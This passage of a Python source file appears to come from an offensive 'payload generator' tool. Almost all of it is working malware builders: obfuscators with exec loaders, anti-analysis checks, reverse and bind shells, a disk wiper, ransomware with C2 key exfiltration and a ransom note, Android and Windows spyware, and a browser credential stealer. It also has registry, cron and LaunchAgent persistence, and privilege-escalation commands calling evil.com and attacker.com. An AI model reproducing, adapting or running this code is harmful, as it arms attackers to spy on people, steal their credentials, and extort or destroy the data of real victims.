        # Randomly shuffle independent lines
        if len(new_lines) > 10:
            independent = [i for i, line in enumerate(new_lines) 
                         if not any(kw in line for kw in ['def ', 'class ', 'import ', 'from '])]
            if len(independent) > 3:
                first, last = independent[0], independent[-1]
                middle = independent[1:-1]
                random.shuffle(middle)
                new_lines = new_lines[:first+1] + [new_lines[i] for i in middle] + new_lines[last:]
        
        return '\n'.join(new_lines)
    
    def _aes_encrypt_obfuscation(self, payload: str) -> str:
        """AES-256 encryption with key derivation"""
        # Generate random salt and derive key
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(b"password"))
        
        # Encrypt payload
        cipher = Fernet(key)
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""# AES-256 Encrypted Payload
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

# Decryption
salt = {salt!r}
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000,
)
key = base64.urlsafe_b64encode(kdf.derive(b"password"))
cipher = Fernet(key)
exec(cipher.decrypt({encrypted!r}).decode())"""
    
    def _rsa_encrypt_obfuscation(self, payload: str) -> str:
        """RSA asymmetric encryption obfuscation"""
        # Generate RSA key pair
        key = RSA.generate(2048)
        private_key = key.export_key()
        public_key = key.publickey().export_key()
        
        # Encrypt with public key
        cipher = PKCS1_OAEP.new(key.publickey())
        encrypted = cipher.encrypt(payload.encode())
        
        return f"""# RSA Encrypted Payload
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

private_key = {private_key!r}
key = RSA.import_key(private_key)
cipher = PKCS1_OAEP.new(key)
exec(cipher.decrypt({encrypted!r}).decode())"""
    
    def _code_splitting_obfuscation(self, payload: str) -> str:
        """Split code into multiple fragments"""
        parts = []
        chunk_size = len(payload) // random.randint(3,7)
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            parts.append(base64.b64encode(part.encode()).decode())
        
        var_name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        code = f"{var_name} = ["
        for part in parts:
            code += f'"{part}", '
        code = code.rstrip(', ') + ']\n'
        code += f'exec("".join([base64.b64decode(p).decode() for p in {var_name}]))'
        
        return f"import base64\n{code}"
    
    def _add_anti_analysis(self, payload: str) -> str:
        """Add anti-analysis techniques"""
        anti_code = """
def _check_debug():
    import sys, os, time, ctypes
    
    # Check for debugger
    try:
        if hasattr(sys, 'gettrace') and sys.gettrace():
            os._exit(1)
    except:
        pass
    
    # Check for VM/sandbox
    try:
        if platform.system() == "Windows":
            try:
                ctypes.windll.kernel32.IsDebuggerPresent()
                # Check for common VM processes
                processes = [
                    "vmtoolsd.exe", "vmwaretray.exe", 
                    "vmwareuser.exe", "vboxservice.exe"
                ]
                for proc in processes:
                    if ctypes.windll.kernel32.GetModuleHandleA(proc) != 0:
                        os._exit(1)
            except:
                pass
        else:
            # Linux/Mac anti-VM checks
            try:
                with open('/proc/cpuinfo') as f:
                    cpuinfo = f.read().lower()
                    if any(x in cpuinfo for x in ['hypervisor', 'vmx', 'svm']):
                        os._exit(1)
                
                # Check for common VM tools
                if any(os.path.exists(path) for path in [
                    '/usr/bin/VBoxClient', '/usr/bin/vmware-user'
                ]):
                    os._exit(1)
            except:
                pass
    
    # Delay execution randomly
    time.sleep(random.uniform(0.5, 3))

_check_debug()
"""
        return anti_code + payload
    
    def _add_junk_code(self, payload: str) -> str:
        """Insert junk code that does nothing"""
        junk_code = [
            f"# {hashlib.md5(os.urandom(32)).hexdigest()}",
            f"''' Random docstring {random.randint(1000,9999)} '''",
            f"_{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))} = {random.randint(0,100)}",
            f"def {''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}():\n    return {random.randint(1000,9999)}",
            f"class _{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}:\n    pass"
        ]
        
        lines = payload.split('\n')
        for i in range(random.randint(3,7)):
            pos = random.randint(0, len(lines))
            lines.insert(pos, random.choice(junk_code))
        
        return '\n'.join(lines)
    
    def _env_key_obfuscation(self, payload: str) -> str:
        """Derive key from environment variables"""
        env_vars = ['USERNAME', 'COMPUTERNAME', 'PROCESSOR_ARCHITECTURE', 'HOMEPATH']
        selected = random.sample(env_vars, 2)
        
        return f"""# Environment key derivation
import os, hashlib

def _get_env_key():
    env_data = ''.join(os.getenv('{selected[0]}', '') + os.getenv('{selected[1]}', ''))
    return hashlib.sha256(env_data.encode()).digest()

_key = _get_env_key()
_payload = {base64.b64encode(payload.encode())!r}
exec(base64.b64decode(_payload).decode())"""
    
    def _compile_payload(self, payload: str, method: str) -> str:
        """Compile payload using selected method"""
        temp_file = f"temp_{random.randint(1000,9999)}.py"
        
        try:
            # Save payload to temp file
            with open(temp_file, 'w') as f:
                f.write(payload)
            
            if method == 'pyinstaller':
                os.system(f"pyinstaller --onefile --noconsole {temp_file}")
                return f"dist/{temp_file[:-3]}.exe"
            elif method == 'termux':
                os.system(f"chmod +x {temp_file}")
                return temp_file
            elif method == 'cython':
                # Requires more complex setup
                return payload
            elif method == 'nuitka':
                os.system(f"nuitka --standalone {temp_file}")
                return f"{temp_file[:-3]}.exe"
            
            return payload
        except Exception as e:
            console.print(f"[red]Compilation failed: {str(e)}[/red]")
            return payload
        finally:
            try:
                os.remove(temp_file)
            except:
                pass
    
    # Payload generation methods
    def generate_reverse_tcp(self, ip: str, port: int, encryption: bool = False, encryption_key: str = None, **kwargs) -> str:
        """Generate advanced reverse TCP shell with encryption"""
        if encryption:
            if not encryption_key:
                encryption_key = Fernet.generate_key().decode()
            
            return f"""import socket,subprocess,os,threading
from cryptography.fernet import Fernet

# Encryption setup
key = {encryption_key!r}
cipher = Fernet(key)

def encrypt(data):
    return cipher.encrypt(data.encode())

def decrypt(data):
    return cipher.decrypt(data).decode()

# Connection handler
def handle_connection(s):
    while True:
        try:
            data = decrypt(s.recv(1024))
            if not data:
                break
                
            if data.strip() == 'exit':
                s.close()
                os._exit(0)
                
            proc = subprocess.Popen(data, shell=True, 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, 
                                  stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(encrypt(output.decode() if output else "No output"))
        except:
            break

# Main connection
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("{ip}", {port}))
        
        # Redirect stdio
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        handle_connection(s)
    except:
        import time
        time.sleep(5)  # Reconnect delay
"""
        else:
            return f"""import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{ip}", {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])"""
    
    def generate_bind_tcp(self, ip: str, port: int, encryption: bool = False, encryption_key: str = None, **kwargs) -> str:
        """Generate bind TCP shell with encryption"""
        if encryption:
            if not encryption_key:
                encryption_key = Fernet.generate_key().decode()
            
            return f"""import socket,subprocess,os,threading
from cryptography.fernet import Fernet

# Encryption setup
key = {encryption_key!r}
cipher = Fernet(key)

def encrypt(data):
    return cipher.encrypt(data.encode())

def decrypt(data):
    return cipher.decrypt(data).decode()

# Connection handler
def handle_connection(conn):
    while True:
        try:
            data = decrypt(conn.recv(1024))
            if not data:
                break
                
            if data.strip() == 'exit':
                conn.close()
                os._exit(0)
                
            proc = subprocess.Popen(data, shell=True, 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE, 
                                  stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            conn.send(encrypt(output.decode() if output else "No output"))
        except:
            break

# Main listener
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("{ip}", {port}))
s.listen(5)

while True:
    conn, addr = s.accept()
    threading.Thread(target=handle_connection, args=(conn,)).start()
"""
        else:
            return f"""import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("{ip}", {port}))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])"""
    
    def generate_disk_wiper(self, passes: int = 3, target_dirs: List[str] = None, **kwargs) -> str:
        """Generate advanced disk wiper with multiple passes"""
        if target_dirs is None:
            target_dirs = ["/home", "/var", "/etc"]
        
        return f"""import os, random, time

def wipe_file(path):
    try:
        size = os.path.getsize(path)
        with open(path, 'wb') as f:
            # Multiple passes with different patterns
            for _ in range({passes}):
                f.seek(0)
                if {passes} >= 3:
                    # First pass: zeros
                    f.write(b'\\x00' * size)
                    f.flush()
                    # Second pass: ones
                    f.seek(0)
                    f.write(b'\\xFF' * size)
                    f.flush()
                    # Third pass: random
                    f.seek(0)
                    f.write(os.urandom(size))
                else:
                    # Just random for fewer passes
                    f.write(os.urandom(size))
        os.remove(path)
    except:
        pass

def wipe_disk():
    target_dirs = {target_dirs!r}
    for target in target_dirs:
        for root, dirs, files in os.walk(target):
            for file in files:
                wipe_file(os.path.join(root, file))
            # Optionally wipe directories too
            for dir in dirs:
                try:
                    os.rmdir(os.path.join(root, dir))
                except:
                    pass

# Add some anti-analysis
def check_env():
    # Check for VM/sandbox
    if os.path.exists('/proc/self/cgroup'):
        with open('/proc/self/cgroup') as f:
            if 'docker' in f.read() or 'kubepods' in f.read():
                return False
    
    # Check for debuggers
    try:
        if 'debug' in os.getenv('PYTHON', '').lower():
            return False
    except:
        pass
    
    return True

if check_env():
    wipe_disk()
    # Overwrite itself
    with open(__file__, 'wb') as f:
        f.write(os.urandom(os.path.getsize(__file__)))
    os.remove(__file__)
"""
    
    def generate_advanced_ransomware(self, extensions: List[str], ransom_note: str, c2_enabled: bool = False, 
                                   c2_server: str = None, c2_interval: int = 5, **kwargs) -> str:
        """Generate advanced ransomware with C2 communication"""
        ext_str = ', '.join(f'"{ext}"' for ext in extensions)
        
        c2_code = ""
        if c2_enabled and c2_server:
            c2_code = f"""
def c2_communication(key):
    import requests, json, base64
    from datetime import datetime
    
    while True:
        try:
            host_id = base64.b64encode(hashlib.sha256(os.getenv('COMPUTERNAME', str(random.random())).encode()).digest()).decode()
            data = {{
                'host': host_id,
                'key': key,
                'time': datetime.now().isoformat(),
                'status': 'active'
            }}
            
            headers = {{'Content-Type': 'application/json'}}
            response = requests.post(
                "{c2_server}",
                data=json.dumps(data),
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                command = response.json().get('command')
                if command == 'decrypt':
                    return response.json().get('decrypt_key')
            
        except:
            pass
        
        time.sleep({c2_interval} * 60)
"""
        
        return f"""import os, random
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64, hashlib, time
from threading import Thread

{c2_code if c2_enabled else ''}

class Ransomware:
    def __init__(self):
        self.extensions = [{ext_str}]
        self.ransom_note = '''{ransom_note}

Your files have been encrypted with military-grade AES-256 encryption.
To decrypt your files, you must pay 0.5 BTC to: 1AbCdEfGhIjKlMnOpQrStUvWxYz

After payment, contact us at: decryptor@protonmail.com
'''
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        {f'self.c2_thread = Thread(target=c2_communication, args=(base64.b64encode(self.key).decode(),))' if c2_enabled else ''}
    
    def encrypt_file(self, path):
        try:
            with open(path, 'rb') as f:
                data = f.read()
            
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            encrypted = cipher.encrypt(pad(data, AES.block_size))
            
            with open(path + '.encrypted', 'wb') as f:
                f.write(encrypted)
            
            os.remove(path)
        except:
            pass
    
    def generate_note(self):
        note_path = os.path.join(os.path.expanduser('~'), 'READ_ME.txt')
        with open(note_path, 'w') as f:
            f.write(self.ransom_note)
    
    def run(self):
        {f'self.c2_thread.start()' if c2_enabled else ''}
        
        for root, dirs, files in os.walk('/'):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensions):
                    self.encrypt_file(os.path.join(root, file))
        
        self.generate_note()
        
        {f'decrypt_key = c2_communication(base64.b64encode(self.key).decode())' if c2_enabled else ''}

if __name__ == "__main__":
    ransomware = Ransomware()
    ransomware.run()
"""
    
    def generate_android_spy_module(self, c2_server: str, interval: int, jitter: int, persistence: bool = True, **kwargs) -> str:
        """Generate advanced Android spy module for Termux"""
        persistence_code = """
def install_persistence():
    try:
        # Create autostart script
        startup_script = os.path.expanduser('~/.termux/boot/start_spy')
        with open(startup_script, 'w') as f:
            f.write('#!/data/data/com.termux/files/usr/bin/sh\\n')
            f.write(f'nohup python {os.path.abspath(__file__)} &\\n')
        
        os.chmod(startup_script, 0o755)
        return True
    except:
        return False
""" if persistence else ""
        
        return f"""import os, time, random, requests, json
from subprocess import check_output
from threading import Thread

{persistence_code if persistence else ''}

class AndroidSpy:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.base_interval = {interval} * 60
        self.jitter = {jitter} / 100
        self.session_id = hashlib.sha256(os.urandom(32)).hexdigest()
    
    def collect_data(self):
        data = {{
            'device': {{
                'model': check_output('getprop ro.product.model', shell=True).decode().strip(),
                'manufacturer': check_output('getprop ro.product.manufacturer', shell=True).decode().strip(),
                'android_version': check_output('getprop ro.build.version.release', shell=True).decode().strip(),
                'serial': check_output('getprop ro.serialno', shell=True).decode().strip()
            }},
            'network': {{
                'ip': check_output('ip addr show wlan0 | grep "inet "', shell=True).decode().strip(),
                'mac': check_output('ip addr show wlan0 | grep "link/ether"', shell=True).decode().strip()
            }},
            'sms': self._get_sms(),
            'location': self._get_location(),
            'session_id': self.session_id,
            'timestamp': time.time()
        }}
        return data
    
    def _get_sms(self):
        try:
            return check_output('termux-sms-list -l 50', shell=True).decode()
        except:
            return "SMS access denied"
    
    def _get_location(self):
        try:
            return check_output('termux-location', shell=True).decode()
        except:
            return "Location access denied"
    
    def send_to_c2(self, data):
        try:
            headers = {{'Content-Type': 'application/json'}}
            response = requests.post(
                f"{{self.c2_server}}/report",
                data=json.dumps(data),
                headers=headers,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        {f'install_persistence()' if persistence else ''}
        
        while True:
            data = self.collect_data()
            self.send_to_c2(data)
            
            # Randomize interval with jitter
            current_interval = self.base_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(current_interval)

if __name__ == "__main__":
    spy = AndroidSpy()
    spy.run()
"""
    
    def generate_windows_spy_module(self, c2_server: str, interval: int, jitter: int, persistence: bool = True, **kwargs) -> str:
        """Generate advanced Windows spy module"""
        persistence_code = """
def install_persistence():
    try:
        import winreg, sys
        
        # Get executable path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Add to registry
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
        
        return True
    except:
        return False
""" if persistence else ""
        
        return f"""import os, time, random, requests, json, platform, socket, getpass
from threading import Thread

{persistence_code if persistence else ''}

class WindowsSpy:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.base_interval = {interval} * 60
        self.jitter = {jitter} / 100
        self.session_id = hashlib.sha256(os.urandom(32)).hexdigest()
    
    def collect_data(self):
        data = {{
            'system': {{
                'hostname': socket.gethostname(),
                'username': getpass.getuser(),
                'os': platform.platform(),
                'architecture': platform.architecture(),
                'processor': platform.processor()
            }},
            'network': self._get_network_info(),
            'screenshots': self._take_screenshots(),
            'session_id': self.session_id,
            'timestamp': time.time()
        }}
        return data
    
    def _get_network_info(self):
        try:
            import subprocess
            result = subprocess.check_output("ipconfig /all", shell=True)
            return result.decode('utf-8', errors='ignore')
        except:
            return "Network info unavailable"
    
    def _take_screenshots(self):
        try:
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                return base64.b64encode(mss.tools.to_png(screenshot.rgb, screenshot.size)).decode()
        except:
            return None
    
    def send_to_c2(self, data):
        try:
            headers = {{'Content-Type': 'application/json'}}
            response = requests.post(
                f"{{self.c2_server}}/report",
                data=json.dumps(data),
                headers=headers,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        {f'install_persistence()' if persistence else ''}
        
        while True:
            data = self.collect_data()
            self.send_to_c2(data)
            
            # Randomize interval with jitter
            current_interval = self.base_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(current_interval)

if __name__ == "__main__":
    spy = WindowsSpy()
    spy.run()
"""
    
    def generate_browser_exploit(self, c2_server: str, interval: int, jitter: int, persistence: bool = True, **kwargs) -> str:
        """Generate browser credential stealer"""
        persistence_code = """
def install_persistence():
    try:
        if platform.system() == "Windows":
            import winreg
            
            # Get executable path
            if getattr(sys, 'frozen', False):
                exe_path = sys.executable
            else:
                exe_path = os.path.abspath(__file__)
            
            # Add to registry
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "BrowserHelper", 0, winreg.REG_SZ, exe_path)
            
            return True
        else:
            # Linux/Mac persistence
            cron_entry = f"@reboot python {os.path.abspath(__file__)}"
            with open(os.path.expanduser("~/.crontab"), "a") as f:
                f.write(cron_entry + "\\n")
            
            os.system("crontab ~/.crontab")
            return True
    except:
        return False
""" if persistence else ""
        
        return f"""import os, time, random, requests, json, platform, sqlite3, base64
from threading import Thread
from Crypto.Cipher import AES

{persistence_code if persistence else ''}

class BrowserStealer:
    def __init__(self):
        self.c2_server = "{c2_server}"
        self.base_interval = {interval} * 60
        self.jitter = {jitter} / 100
        self.session_id = hashlib.sha256(os.urandom(32)).hexdigest()
    
    def get_browser_credentials(self):
        credentials = []
        
        # Chrome on Windows
        try:
            if platform.system() == "Windows":
                import win32crypt
                
                chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 
                                         'Google\\Chrome\\User Data\\Default\\Login Data')
                
                if os.path.exists(chrome_path):
                    conn = sqlite3.connect(chrome_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, user, encrypted_pass in cursor.fetchall():
                        try:
                            # Decrypt the password
                            decrypted = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1]
                            if decrypted:
                                credentials.append({{
                                    'url': url,
                                    'username': user,
                                    'password': decrypted.decode(),
                                    'browser': 'Chrome'
                                }})
                        except:
                            continue
                    
                    cursor.close()
                    conn.close()
        except:
            pass
        
        # Firefox (cross-platform)
        try:
            from bs4 import BeautifulSoup
            
            firefox_profiles = []
            if platform.system() == "Windows":
                firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla\\Firefox\\Profiles')
            else:
                firefox_path = os.path.expanduser('~/.mozilla/firefox')
            
            if os.path.exists(firefox_path):
                for profile in os.listdir(firefox_path):
                    if profile.endswith('.default'):
                        db_path = os.path.join(firefox_path, profile, 'logins.json')
                        if os.path.exists(db_path):
                            with open(db_path) as f:
                                data = json.load(f)
                                for login in data.get('logins', []):
                                    credentials.append({{
                                        'url': login.get('hostname'),
                                        'username': login.get('username'),
                                        'password': login.get('password'),
                                        'browser': 'Firefox'
                                    }})
        except:
            pass
        
        return credentials
    
    def send_to_c2(self, data):
        try:
            headers = {{'Content-Type': 'application/json'}}
            response = requests.post(
                f"{{self.c2_server}}/credentials",
                data=json.dumps({{'credentials': data, 'session_id': self.session_id}}),
                headers=headers,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        {f'install_persistence()' if persistence else ''}
        
        while True:
            credentials = self.get_browser_credentials()
            if credentials:
                self.send_to_c2(credentials)
            
            # Randomize interval with jitter
            current_interval = self.base_interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(current_interval)

if __name__ == "__main__":
    stealer = BrowserStealer()
    stealer.run()
"""
    
    def generate_persistence_module(self, **kwargs) -> str:
        """Generate cross-platform persistence module"""
        return """import os, sys, platform, ctypes

def is_admin():
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0
    except:
        return False

def install_persistence():
    if platform.system() == "Windows":
        import winreg
        
        # Get executable path
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Add to registry
        try:
            key = winreg.HKEY_CURRENT_USER if not is_admin() else winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
            
            return True
        except:
            return False
    
    elif platform.system() == "Linux":
        try:
            cron_entry = f"@reboot python {os.path.abspath(__file__)}"
            with open("/etc/crontab", "a") as f:
                f.write(cron_entry + "\\n")
            return True
        except:
            try:
                # User crontab as fallback
                with open(os.path.expanduser("~/.crontab"), "a") as f:
                    f.write(cron_entry + "\\n")
                os.system("crontab ~/.crontab")
                return True
            except:
                return False
    
    elif platform.system() == "Darwin":  # macOS
        try:
            plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>python</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
            with open(plist_path, "w") as f:
                f.write(plist)
            
            os.system(f"launchctl load {plist_path}")
            return True
        except:
            return False
    
    return False

if __name__ == "__main__":
    if install_persistence():
        # Your payload here
        while True:
            import time
            time.sleep(60)
"""
    
    def generate_network_scanner(self, **kwargs) -> str:
        """Generate network scanner module"""
        return """import socket, threading, ipaddress, time

class NetworkScanner:
    def __init__(self):
        self.active_hosts = []
        self.ports_to_scan = [21, 22, 23, 80, 443, 445, 3389]
        self.threads = 50
        self.timeout = 1
    
    def scan_ip(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            for port in self.ports_to_scan:
                result = s.connect_ex((str(ip), port))
                if result == 0:
                    self.active_hosts.append({
                        'ip': str(ip),
                        'port': port,
                        'service': self._get_service_name(port)
                    })
            s.close()
        except:
            pass
    
    def _get_service_name(self, port):
        services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            80: 'HTTP',
            443: 'HTTPS',
            445: 'SMB',
            3389: 'RDP'
        }
        return services.get(port, 'Unknown')
    
    def scan_network(self, network):
        net = ipaddress.ip_network(network)
        threads = []
        
        for ip in net.hosts():
            while threading.active_count() > self.threads:
                time.sleep(0.1)
            
            t = threading.Thread(target=self.scan_ip, args=(ip,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return self.active_hosts

if __name__ == "__main__":
    scanner = NetworkScanner()
    print("Scanning network...")
    results = scanner.scan_network("192.168.1.0/24")
    
    print("\\nActive hosts found:")
    for host in results:
        print(f"IP: {host['ip']} | Port: {host['port']} | Service: {host['service']}")
"""
    
    def generate_priv_escalation(self, **kwargs) -> str:
        """Generate privilege escalation module"""
        return """import os, sys, platform, ctypes, subprocess

def is_admin():
    try:
        if platform.system() == "Windows":
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.getuid() == 0
    except:
        return False

def windows_escalation():
    # Try various Windows escalation techniques
    techniques = [
        # Exploit vulnerable services
        'sc config TrustedInstaller binPath= "cmd /c net user hacker Password123 /add && net localgroup administrators hacker /add"',
        'sc start TrustedInstaller',
        
        # Exploit AlwaysInstallElevated
        'reg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f',
        'msiexec /quiet /qn /i http://evil.com/exploit.msi',
        
        # Token impersonation
        'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1\'); Invoke-AllChecks"'
    ]
    
    for cmd in techniques:
        try:
            subprocess.run(cmd, shell=True, check=True)
            if is_admin():
                return True
        except:
            continue
    
    return False

def linux_escalation():
    # Try various Linux escalation techniques
    techniques = [
        # Exploit SUID binaries
        'find / -perm -4000 2>/dev/null',
        
        # Exploit writable cron jobs
        'echo "*/1 * * * * root /bin/bash -c \'/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\'" >> /etc/crontab',
        
        # Exploit sudo misconfigurations
        'sudo -l',
        'sudo --version',
        
        # Kernel exploits
        'uname -a',
        'gcc exploit.c -o exploit && ./exploit'
    ]
    
    for cmd in techniques:
        try:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if b"root" in result.stdout or os.getuid() == 0:
                return True
        except:
            continue
    
    return False

if __name__ == "__main__":
    if is_admin():
        print("Already running with elevated privileges!")
        sys.exit(0)
    
    print("Attempting privilege escalation...")
    success = False
    
    if platform.system() == "Windows":
        success = windows_escalation()
    else:
        success = linux_escalation()
    
    if success and is_admin():
        print("Successfully escalated privileges!")
        # Run your payload here
    else:
        print("Privilege escalation failed")
"""
    
    def _exit_tool(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ WARNING: UNAUTHORIZED USE IS ILLEGAL! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Exiting...[/cyan]")
        self._log_activity("Tool exited")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        generator = AdvancedPayloadGenerator()
        generator.show_main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Canceled[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Error: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
